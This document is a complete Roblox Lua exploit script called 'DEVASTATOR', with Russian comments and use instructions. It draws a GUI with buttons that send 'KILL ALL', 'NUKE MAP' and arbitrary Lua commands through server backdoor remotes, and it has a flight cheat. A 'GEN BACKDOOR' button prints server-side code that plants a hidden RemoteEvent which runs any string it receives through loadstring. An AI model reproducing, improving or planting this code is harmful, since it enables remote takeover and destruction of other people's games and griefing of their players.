--[[ 
    DEVASTATOR v26.6 - ПОЛНАЯ ВЕРСИЯ
    ИНСТРУКЦИЯ:
    1. Скопируй ВЕСЬ код ниже (от начала до конца).
    2. Кнопка 'L' — скрыть меню.
    3. Кнопка 'E' — полет.
]]

local p = game:GetService("Players")
local lp = p.LocalPlayer
local rs = game:GetService("ReplicatedStorage")
local uis = game:GetService("UserInputService")
local cg = game:GetService("CoreGui")
local lit = game:GetService("Lighting")

-- Удаление старых копий
if cg:FindFirstChild("DevFinal") then cg.DevFinal:Destroy() end

local sg = Instance.new("ScreenGui", cg)
sg.Name = "DevFinal"

-- ГЛАВНОЕ ОКНО
local f = Instance.new("Frame", sg)
f.Size = UDim2.new(0, 500, 0, 420)
f.Position = UDim2.new(0.5, -250, 0.5, -210)
f.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
f.BorderSizePixel = 0
f.Active = true
f.Draggable = true -- Стандартное перемещение

local corner = Instance.new("UICorner", f)
local stroke = Instance.new("UIStroke", f)
stroke.Color = Color3.new(1, 0, 0)
stroke.Thickness = 2

-- ЗАГОЛОВОК
local t = Instance.new("TextLabel", f)
t.Size = UDim2.new(1, 0, 0, 40)
t.Text = "DEVASTATOR v26.6 // OVERLORD"
t.BackgroundColor3 = Color3.fromRGB(35, 0, 0)
t.TextColor3 = Color3.new(1, 1, 1)
t.Font = Enum.Font.Code
Instance.new("UICorner", t)

-- ТЕРМИНАЛ (ЛОГИ)
local logs = Instance.new("ScrollingFrame", f)
logs.Size = UDim2.new(1, -20, 0, 100)
logs.Position = UDim2.new(0, 10, 1, -110)
logs.BackgroundColor3 = Color3.new(0,0,0)
logs.BorderSizePixel = 0
logs.CanvasSize = UDim2.new(0,0,0,0)
local lay = Instance.new("UIListLayout", logs)

local function log(txt, col)
    local l = Instance.new("TextLabel", logs)
    l.Size = UDim2.new(1, 0, 0, 20)
    l.Text = "> " .. tostring(txt)
    l.TextColor3 = col or Color3.new(1,0,0)
    l.BackgroundTransparency = 1
    l.Font = Enum.Font.Code
    l.TextXAlignment = Enum.TextXAlignment.Left
    logs.CanvasSize = UDim2.new(0,0,0, lay.AbsoluteContentSize.Y)
    logs.CanvasPosition = Vector2.new(0, 9999)
end

-- ПОЛЕ ВВОДА
local inp = Instance.new("TextBox", f)
inp.Size = UDim2.new(0, 300, 0, 30)
inp.Position = UDim2.new(0.5, -150, 0, 50)
inp.PlaceholderText = "ID / LUA CODE"
inp.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
inp.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", inp)

-- КНОПКИ (СЕТКА)
local g = Instance.new("Frame", f)
g.Size = UDim2.new(1, -20, 0, 200)
g.Position = UDim2.new(0, 10, 0, 100)
g.BackgroundTransparency = 1
local grid = Instance.new("UIGridLayout", g)
grid.CellSize = UDim2.new(0, 150, 0, 35)

local function btn(name, cb, col)
    local b = Instance.new("TextButton", g)
    b.Text = name
    b.BackgroundColor3 = col or Color3.fromRGB(50, 0, 0)
    b.TextColor3 = Color3.new(1, 1, 1)
    b.Font = Enum.Font.Code
    b.MouseButton1Click:Connect(cb)
    Instance.new("UICorner", b)
end

-- ФУНКЦИИ SS (SERVER SIDE)
local function send(code, val)
    local remote = rs:FindFirstChild("NetworkStream") or rs:FindFirstChild("InternalStatus")
    if remote then
        remote:FireServer(code, val)
        log("SS EXECUTED: " .. code, Color3.new(0,1,0))
    else
        log("NO SS DETECTED (LOCAL ONLY)", Color3.new(1,0.5,0))
        if code == 882 then
            local s = lit:FindFirstChildOfClass("Sky") or Instance.new("Sky", lit)
            s.SkyboxBk = val s.SkyboxDn = val s.SkyboxFt = val
        end
    end
end

-- НАПОЛНЕНИЕ КНОПКАМИ
btn("GLOBAL SKY", function() send(882, "rbxassetid://"..inp.Text) end)
btn("GLOBAL AUDIO", function() send(993, "rbxassetid://"..inp.Text) end)
btn("GIVE HAMMER", function() Instance.new("HopperBin", lp.Backpack).BinType = 4 log("Hammer Given") end)
btn("KILL ALL", function() send(771, "for _,p in pairs(game.Players:GetPlayers()) do p.Character:BreakJoints() end") end, Color3.new(0.6,0,0))
btn("NUKE MAP", function() send(771, "for _,v in pairs(workspace:GetChildren()) do if v:IsA('BasePart') then v:Destroy() end end") end, Color3.new(0.8,0,0))
btn("FLY (E)", function() log("PRESS 'E' TO FLY") end)
btn("REMOTE EXEC", function() send(771, inp.Text) end, Color3.new(0, 0.4, 0))
btn("GEN BACKDOOR", function()
    local bc = "local r=Instance.new('RemoteEvent',game:GetService('ReplicatedStorage')) r.Name='NetworkStream' r.OnServerEvent:Connect(function(_,i,v) if i==771 then loadstring(v)() end end)"
    print(bc) log("CODE IN F9 CONSOLE!")
end)

-- ПОЛЕТ (FLY)
local flying = false
local speed = 50
uis.InputBegan:Connect(function(k, m)
    if m then return end
    if k.KeyCode == Enum.KeyCode.E then
        flying = not flying
        local char = lp.Character or lp.CharacterAdded:Wait()
        local hrp = char:WaitForChild("HumanoidRootPart")
        if flying then
            log("FLY: ON", Color3.new(0,1,0))
            task.spawn(function()
                local bv = Instance.new("BodyVelocity", hrp)
                bv.MaxForce = Vector3.new(1e8, 1e8, 1e8)
                while flying do
                    local cam = workspace.CurrentCamera
                    local dir = Vector3.new(0,0,0)
                    if uis:IsKeyDown(Enum.KeyCode.W) then dir = dir + cam.CFrame.LookVector end
                    if uis:IsKeyDown(Enum.KeyCode.S) then dir = dir - cam.CFrame.LookVector end
                    bv.Velocity = dir * speed
                    task.wait()
                end
                bv:Destroy()
            end)
        else
            log("FLY: OFF", Color3.new(1,0,0))
        end
    elseif k.KeyCode == Enum.KeyCode.L then
        f.Visible = not f.Visible
    end
end)

log("DEVASTATOR v26.6 READY.")
